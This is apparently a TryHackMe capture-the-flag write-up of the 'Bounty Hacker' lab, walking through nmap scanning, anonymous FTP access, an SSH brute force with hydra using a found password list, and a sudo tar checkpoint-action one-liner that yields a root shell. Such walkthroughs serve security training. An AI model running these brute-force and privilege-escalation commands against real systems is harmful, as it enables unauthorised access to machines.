# Bounty Hacker
> 4lch3my | March 06, 2023
-------------------
#### This is a machine that allows you to practise web app hacking and privilege escalation
#### [Room Link](https://tryhackme.com/room/cowboyhacker)

## Tasks
##### 1. Deploy the machine and connect to our network
  Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.

##### 2. Find open ports on the machine
This is where the basics of recon comes into play. To start, I use [nmap] which is default option on the perosnal Kali install I have. We start with a basic command
  ` nmap -sC -sV -A MACHINE_IP `
The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A outputs in agressive mode, so we can follow along with the commands and enumeration.
  In our NMAP results we get:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 18:41 CET
Nmap scan report for MACHINE_IP
Host is up (0.049s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.14.36.110
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.76 seconds
  ```
As we can see, there is an FTP server running in port 21. Luckily for us, we do not need a password to enter it (displayed by the `ftp-anon: Anonymous FTP login allowed` message). <br>
Let's FTP in to the machine:
<br>

`ftp MACHINE_IP`
<br>

When propted with the Username, we can use `anonymous` user to log-in without a password.
  ```
Connected to MACHINE_IP.
220 (vsFTPd 3.0.3)
Name (MACHINE_IP:elliot): anonymous
230 Login successful.
Remote system type is UNIX.
```
Lets now list the files what we can see
```
ftp> ls
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
 ```
Now, we can copy these files to our own machine for further analysis.
 ```
ftp> get locks.txt
local: locks.txt remote: locks.txt
227 Entering Passive Mode (10,10,84,240,160,13).
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*****************************************************************|   418       10.76 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (4.65 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
227 Entering Passive Mode (10,10,84,240,188,110).
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*****************************************************************|    68      169.40 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (1.27 KiB/s)
ftp> quit
221 Goodbye.
  ```
##### 3. Who wrote the task list?
As we have these files on our machine, we are able to read the contens of them, to find out if there are any usefull information nuggets in any of them. Lets start with `task.txt`
<br>

`cat task.txt`
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
  ```
Hmmm, I think we have found our user `lin`. On to the other file: `cat locks.txt`
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
##### 4. What service can you bruteforce with the text file found?
This seems to be a list of potential passwords for the user. Time for some good old brute forcing with [hydra]:

`hydra -l lin -P locks.txt ssh://MACHINE_IP`

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-06 18:49:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://MACHINE_IP:22/
[22][ssh] host: MACHINE_IP   login: lin   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-06 18:49:54
```

##### 5. What is the users password? 
` [22][ssh] host: MACHINE_IP   login: lin   password: [REDACTED]`

And there we go, after just a few minutes we where able to find the correct password for the user `lin`. We can now SSH in to the machine: `ssh lin@MACHINE_IP`

```
The authenticity of host '10.10.84.240 (10.10.84.240)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? es
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added 'MACHINE_IP' (ED25519) to the list of known hosts.
lin@MACHINE_IP's password: [REDACTED]
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from MACHINE_IP
```
##### 6. user.txt
Finding `user.txt` can be done easily enough

`ls` >> cat `user.txt`

![alt text](https://github.com/4lch3my/WriteUps/tree/main/TryHackMe/TryHackMe%20-%20Bounty%20Hacker/images/user.png?raw=true)

##### 7. root.txt

On to `root.txt` then. First we need to determine what folders and commands does the user `lin` have access to what we can run with `sudo` permission. To find this out we can run: `sudo -l`

```
[sudo] password for lin:
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
Now that we have determined that we can access to ``user.txt`, lets see how we can abuse this feature on: [GTFOBins](https://gtfobins.github.io/).
![alt text](https://github.com/4lch3my/WriteUps/tree/main/TryHackMe/TryHackMe%20-%20Bounty%20Hacker/images/tar.png)
![alt text](https://github.com/4lch3my/WriteUps/tree/main/TryHackMe/TryHackMe%20-%20Bounty%20Hacker/images/tar2.png)
Now let's run it against the root user: `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

```
tar: Removing leading `/' from member names
# whoami
root
```
And there we go! We are sucessfully root on the machine!

 #### Thank you for checking out my writeup about the THM room: Bounty Hacker! If you are interested in other writeups of mine or interetsed in some of my codeing work, please feel free to look around my GitHub page! Happy hacking! - 4lch3my
